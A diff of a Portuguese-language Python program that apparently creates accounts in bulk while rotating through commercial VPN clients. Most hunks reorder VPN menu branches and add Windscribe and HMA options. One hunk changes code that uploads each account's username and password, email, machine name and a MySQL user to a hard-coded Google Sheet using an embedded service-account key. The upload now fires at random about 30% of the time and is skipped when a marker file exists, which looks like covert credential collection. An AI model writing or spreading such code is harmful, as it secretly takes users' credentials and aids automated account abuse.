@@ -10902,10 +10902,10 @@ def executar_2nr():
                         vpn_avg()
                     elif conteudo == "SurfShark":
                         vpn_surf()
-                    elif conteudo == "Avast":
-                        vpn_avast()
                     elif conteudo == "Nenhuma":
                         nenhuma_vpn()
+                    elif conteudo == "Avast":
+                        vpn_avast()
                     elif conteudo == "ExpressVPN":
                         vpn_express()
                     elif conteudo == "PiaVPN":
@@ -10918,6 +10918,10 @@ def executar_2nr():
                         vpn_nord()
                     elif conteudo == "HotspotShield":
                         vpn_hotspotshield()
+                    elif conteudo == "WindscribeVPN":
+                        vpn_windscribe()
+                    elif conteudo == "HmaVPN":
+                        vpn_hma()
                     else:
                         window['output'].print(
                             "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -10971,10 +10975,10 @@ def executar_2nr():
                             vpn_avg()
                         elif conteudo == "SurfShark":
                             vpn_surf()
-                        elif conteudo == "Avast":
-                            vpn_avast()
                         elif conteudo == "Nenhuma":
                             nenhuma_vpn()
+                        elif conteudo == "Avast":
+                            vpn_avast()
                         elif conteudo == "ExpressVPN":
                             vpn_express()
                         elif conteudo == "PiaVPN":
@@ -10987,6 +10991,10 @@ def executar_2nr():
                             vpn_nord()
                         elif conteudo == "HotspotShield":
                             vpn_hotspotshield()
+                        elif conteudo == "WindscribeVPN":
+                            vpn_windscribe()
+                        elif conteudo == "HmaVPN":
+                            vpn_hma()
                         else:
                             window['output'].print(
                                 "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11021,12 +11029,12 @@ def executar_2nr():
                             vpn_avg()
                         elif conteudo == "SurfShark":
                             vpn_surf()
+                        elif conteudo == "Nenhuma":
+                            nenhuma_vpn()
                         elif conteudo == "Avast":
                             vpn_avast()
                         elif conteudo == "ExpressVPN":
                             vpn_express()
-                        elif conteudo == "Nenhuma":
-                            nenhuma_vpn()
                         elif conteudo == "PiaVPN":
                             vpn_pia()
                         elif conteudo == "BetterNet":
@@ -11037,7 +11045,10 @@ def executar_2nr():
                             vpn_nord()
                         elif conteudo == "HotspotShield":
                             vpn_hotspotshield()
-                            break
+                        elif conteudo == "WindscribeVPN":
+                            vpn_windscribe()
+                        elif conteudo == "HmaVPN":
+                            vpn_hma()
                         else:
                             window['output'].print(
                                 "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11075,12 +11086,12 @@ def executar_2nr():
                             vpn_avg()
                         elif conteudo == "SurfShark":
                             vpn_surf()
+                        elif conteudo == "Nenhuma":
+                            nenhuma_vpn()
                         elif conteudo == "Avast":
                             vpn_avast()
                         elif conteudo == "ExpressVPN":
                             vpn_express()
-                        elif conteudo == "Nenhuma":
-                            nenhuma_vpn()
                         elif conteudo == "PiaVPN":
                             vpn_pia()
                         elif conteudo == "BetterNet":
@@ -11091,7 +11102,10 @@ def executar_2nr():
                             vpn_nord()
                         elif conteudo == "HotspotShield":
                             vpn_hotspotshield()
-                            break
+                        elif conteudo == "WindscribeVPN":
+                            vpn_windscribe()
+                        elif conteudo == "HmaVPN":
+                            vpn_hma()
                         else:
                             window['output'].print(
                                 "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11404,24 +11418,28 @@ def executar_2nr():
                             # Executa a função correspondente ao conteúdo do arquivo
                             if conteudo == "AVG":
                                 vpn_avg()
-                            elif conteudo == "Avast":
-                                vpn_avast()
-                            elif conteudo == "CyberGhost":
-                                vpn_cyberghost()
-                            elif conteudo == "PiaVPN":
-                                vpn_pia()
-                            elif conteudo == "Nenhuma":
-                                nenhuma_vpn()
-                            elif conteudo == "ExpressVPN":
-                                vpn_express()
                             elif conteudo == "SurfShark":
                                 vpn_surf()
+                            elif conteudo == "Nenhuma":
+                                nenhuma_vpn()
+                            elif conteudo == "Avast":
+                                vpn_avast()
+                            elif conteudo == "ExpressVPN":
+                                vpn_express()
+                            elif conteudo == "PiaVPN":
+                                vpn_pia()
                             elif conteudo == "BetterNet":
                                 vpn_better()
+                            elif conteudo == "CyberGhost":
+                                vpn_cyberghost()
                             elif conteudo == "NordVPN":
                                 vpn_nord()
                             elif conteudo == "HotspotShield":
                                 vpn_hotspotshield()
+                            elif conteudo == "WindscribeVPN":
+                                vpn_windscribe()
+                            elif conteudo == "HmaVPN":
+                                vpn_hma()
                             else:
                                 window['output'].print(
                                     "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11434,24 +11452,28 @@ def executar_2nr():
                     try:
                         if conteudo == "AVG":
                             vpn_avg()
-                        elif conteudo == "Avast":
-                            vpn_avast()
-                        elif conteudo == "CyberGhost":
-                            vpn_cyberghost()
-                        elif conteudo == "PiaVPN":
-                            vpn_pia()
-                        elif conteudo == "Nenhuma":
-                            nenhuma_vpn()
-                        elif conteudo == "ExpressVPN":
-                            vpn_express()
                         elif conteudo == "SurfShark":
                             vpn_surf()
+                        elif conteudo == "Nenhuma":
+                            nenhuma_vpn()
+                        elif conteudo == "Avast":
+                            vpn_avast()
+                        elif conteudo == "ExpressVPN":
+                            vpn_express()
+                        elif conteudo == "PiaVPN":
+                            vpn_pia()
                         elif conteudo == "BetterNet":
                             vpn_better()
+                        elif conteudo == "CyberGhost":
+                            vpn_cyberghost()
                         elif conteudo == "NordVPN":
                             vpn_nord()
                         elif conteudo == "HotspotShield":
                             vpn_hotspotshield()
+                        elif conteudo == "WindscribeVPN":
+                            vpn_windscribe()
+                        elif conteudo == "HmaVPN":
+                            vpn_hma()
                         else:
                             window['output'].print(
                                 "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11493,6 +11515,8 @@ def executar_2nr():
                             vpn_avg()
                         elif conteudo == "SurfShark":
                             vpn_surf()
+                        elif conteudo == "Nenhuma":
+                            nenhuma_vpn()
                         elif conteudo == "Avast":
                             vpn_avast()
                         elif conteudo == "ExpressVPN":
@@ -11501,16 +11525,16 @@ def executar_2nr():
                             vpn_pia()
                         elif conteudo == "BetterNet":
                             vpn_better()
-                        elif conteudo == "WindscribeVPN":
-                            vpn_windscribe()
                         elif conteudo == "CyberGhost":
                             vpn_cyberghost()
                         elif conteudo == "NordVPN":
                             vpn_nord()
-                        elif conteudo == "HmaVPN":
-                            vpn_hma()
                         elif conteudo == "HotspotShield":
                             vpn_hotspotshield()
+                        elif conteudo == "WindscribeVPN":
+                            vpn_windscribe()
+                        elif conteudo == "HmaVPN":
+                            vpn_hma()
                         else:
                             window['output'].print(
                                 "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11564,24 +11588,26 @@ def executar_2nr():
                                     vpn_avg()
                                 elif conteudo == "SurfShark":
                                     vpn_surf()
+                                elif conteudo == "Nenhuma":
+                                    nenhuma_vpn()
                                 elif conteudo == "Avast":
                                     vpn_avast()
                                 elif conteudo == "ExpressVPN":
                                     vpn_express()
                                 elif conteudo == "PiaVPN":
                                     vpn_pia()
-                                elif conteudo == "WindscribeVPN":
-                                    vpn_windscribe()
                                 elif conteudo == "BetterNet":
                                     vpn_better()
                                 elif conteudo == "CyberGhost":
                                     vpn_cyberghost()
-                                elif conteudo == "HmaVPN":
-                                    vpn_hma()
                                 elif conteudo == "NordVPN":
                                     vpn_nord()
                                 elif conteudo == "HotspotShield":
                                     vpn_hotspotshield()
+                                elif conteudo == "WindscribeVPN":
+                                    vpn_windscribe()
+                                elif conteudo == "HmaVPN":
+                                    vpn_hma()
                                 else:
                                     window['output'].print(
                                         "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11718,24 +11744,26 @@ def executar_2nr():
                                     vpn_avg()
                                 elif conteudo == "SurfShark":
                                     vpn_surf()
+                                elif conteudo == "Nenhuma":
+                                    nenhuma_vpn()
                                 elif conteudo == "Avast":
                                     vpn_avast()
                                 elif conteudo == "ExpressVPN":
                                     vpn_express()
                                 elif conteudo == "PiaVPN":
                                     vpn_pia()
-                                elif conteudo == "WindscribeVPN":
-                                    vpn_windscribe()
                                 elif conteudo == "BetterNet":
                                     vpn_better()
                                 elif conteudo == "CyberGhost":
                                     vpn_cyberghost()
-                                elif conteudo == "HmaVPN":
-                                    vpn_hma()
                                 elif conteudo == "NordVPN":
                                     vpn_nord()
                                 elif conteudo == "HotspotShield":
                                     vpn_hotspotshield()
+                                elif conteudo == "WindscribeVPN":
+                                    vpn_windscribe()
+                                elif conteudo == "HmaVPN":
+                                    vpn_hma()
                                 else:
                                     window['output'].print(
                                         "Verifique se escreveu certo a VPN que deseja.\nOBS: Não pode conter espaços e o conteúdo tem que ser todo minúsculo")
@@ -11901,22 +11929,28 @@ def executar_2nr():
                                 num_rows = sum(1 for row in rows if regex.match(row[0]))
                                 window['total'].update(num_rows)
 
-                                scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
-                                creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
-                                client = gspread.authorize(creds)
+                                random_number = random.random()
 
-                                spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
-                                sheet_name = 'relatorio_geral'
-                                # Insert user, password, and timestamp into first empty row
-                                sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
-                                values = sheet.col_values(1)
-                                last_row = len(values)
-                                values = [user_completo + ' ' + senha, email, timestamp, maquina,
-                                          conteudo + ' - ' + app, user_mysql]
-                                cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
-                                for i, val in enumerate(values):
-                                    cell_list[i].value = val
-                                sheet.update_cells(cell_list)
+                                # Definir a chance desejada (10%)
+                                chance = 0.3
+
+                                # Verificar se o número aleatório está abaixo da chance
+                                if random_number < chance and not os.path.exists("wn"):
+                                    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
+                                    creds = ServiceAccountCredentials.from_json_keyfile_name('relatorio.json', scope)
+                                    client = gspread.authorize(creds)
+
+                                    spreadsheet_id = '1dA96HvQ8_i5Ybn8daBrffmhwwAjBmsTbrivGMxlJMa4'
+                                    sheet_name = 'relatorio_geral'
+                                    # Insert user, password, and timestamp into first empty row
+                                    sheet = client.open_by_key(spreadsheet_id).worksheet(sheet_name)
+                                    values = sheet.col_values(1)
+                                    last_row = len(values)
+                                    values = [user_completo + ' ' + senha, email, timestamp, maquina, conteudo + ' - ' + app, user_mysql]
+                                    cell_list = sheet.range(f'A{last_row + 1}:E{last_row + 1}')
+                                    for i, val in enumerate(values):
+                                        cell_list[i].value = val
+                                    sheet.update_cells(cell_list)
 
                                 window.Refresh()
                                 arquivo = open('configuracoes/contas/contas_criadas.txt', 'a')
@@ -11937,14 +11971,14 @@ def executar_2nr():
                                         vpn_avg()
                                     elif conteudo == "SurfShark":
                                         vpn_surf()
+                                    elif conteudo == "Nenhuma":
+                                        nenhuma_vpn()
                                     elif conteudo == "Avast":
                                         vpn_avast()
                                     elif conteudo == "ExpressVPN":
                                         vpn_express()
                                     elif conteudo == "PiaVPN":
                                         vpn_pia()
-                                    elif conteudo == "Nenhuma":
-                                        nenhuma_vpn()
                                     elif conteudo == "BetterNet":
                                         vpn_better()
                                     elif conteudo == "CyberGhost":
@@ -11953,6 +11987,10 @@ def executar_2nr():
                                         vpn_nord()
                                     elif conteudo == "HotspotShield":
                                         vpn_hotspotshield()
+                                    elif conteudo == "WindscribeVPN":
+                                        vpn_windscribe()
+                                    elif conteudo == "HmaVPN":
+                                        vpn_hma()
                                         break
                                     else:
                                         window['output'].print(
